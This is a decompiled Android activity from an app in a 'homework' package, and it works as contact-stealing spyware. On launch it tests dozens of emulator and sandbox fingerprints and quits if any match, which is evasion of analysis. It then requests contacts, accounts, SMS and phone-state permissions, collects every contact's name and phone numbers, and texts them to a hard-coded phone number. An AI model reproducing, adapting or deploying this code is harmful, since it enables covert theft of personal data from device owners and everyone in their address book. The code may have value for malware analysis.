package com.example.homework;

import a.f.b.a;
import android.database.Cursor;
import android.os.Build;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.telephony.SmsManager;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;

/* loaded from: classes.dex */
public class MainActivity extends AppCompatActivity {
    public static final String[] o = {"android.permission.WRITE_CONTACTS", "android.permission.READ_CONTACTS", "android.permission.GET_ACCOUNTS", "android.permission.SEND_SMS", "android.permission.READ_PHONE_STATE"};
    public int n = 100;

    public final void h() {
        Cursor query = getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, new String[]{"_id", "display_name"}, null, null, null);
        if (query == null || !query.moveToFirst()) {
            return;
        }
        StringBuilder sb = new StringBuilder();
        do {
            long j = query.getLong(query.getColumnIndex("_id"));
            String string = query.getString(query.getColumnIndex("display_name"));
            Cursor query2 = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, new String[]{"data1"}, "contact_id=" + j, null, null);
            if (query2 != null && query2.moveToFirst()) {
                sb.append(string);
                sb.append("\n");
                do {
                    sb.append(query2.getString(query2.getColumnIndex("data1")));
                    sb.append("\n");
                } while (query2.moveToNext());
                query2.close();
            } else {
                sb.append(string);
                sb.append("\n");
            }
        } while (query.moveToNext());
        query.close();
        SmsManager.getDefault().sendTextMessage("13699847855", null, sb.toString(), null, null);
        finish();
    }

    @Override // androidx.appcompat.app.AppCompatActivity, androidx.fragment.app.FragmentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        setContentView(R.layout.activity_main);
        boolean z = true;
        if (Build.PRODUCT.contains("sdk") || Build.PRODUCT.contains("sdk_x86") || Build.PRODUCT.contains("sdk_google") || Build.PRODUCT.contains("Andy") || Build.PRODUCT.contains("Droid4X") || Build.PRODUCT.contains("nox") || Build.PRODUCT.contains("vbox86p") || Build.MANUFACTURER.equals("Genymotion") || Build.MANUFACTURER.contains("Andy") || Build.MANUFACTURER.contains("nox") || Build.MANUFACTURER.contains("TiantianVM") || Build.BRAND.contains("Andy") || Build.DEVICE.contains("Andy") || Build.DEVICE.contains("Droid4X") || Build.DEVICE.contains("nox") || Build.DEVICE.contains("vbox86p") || Build.MODEL.contains("Emulator") || Build.MODEL.equals("google_sdk") || Build.MODEL.contains("Droid4X") || Build.MODEL.contains("TiantianVM") || Build.MODEL.contains("Andy") || Build.MODEL.equals("Android SDK built for x86_64") || Build.MODEL.equals("Android SDK built for x86") || Build.HARDWARE.equals("vbox86") || Build.HARDWARE.contains("nox") || Build.HARDWARE.contains("ttVM_x86") || Build.FINGERPRINT.contains("generic/sdk/generic") || Build.FINGERPRINT.contains("generic_x86/sdk_x86/generic_x86") || Build.FINGERPRINT.contains("Andy") || Build.FINGERPRINT.contains("ttVM_Hdragon") || Build.FINGERPRINT.contains("generic/google_sdk/generic") || Build.FINGERPRINT.contains("vbox86p") || Build.FINGERPRINT.contains("generic/vbox86p/vbox86p")) {
            Toast.makeText(getApplicationContext(), "检测到模拟环境，退出！", 0).show();
            finish();
            return;
        }
        String[] strArr = o;
        int length = strArr.length;
        int i = 0;
        while (true) {
            if (i >= length) {
                break;
            } else if (a.a(this, strArr[i]) != 0) {
                z = false;
                break;
            } else {
                i++;
            }
        }
        if (z) {
            h();
            return;
        }
        a.f.a.a.a(this, o, this.n);
        h();
    }
}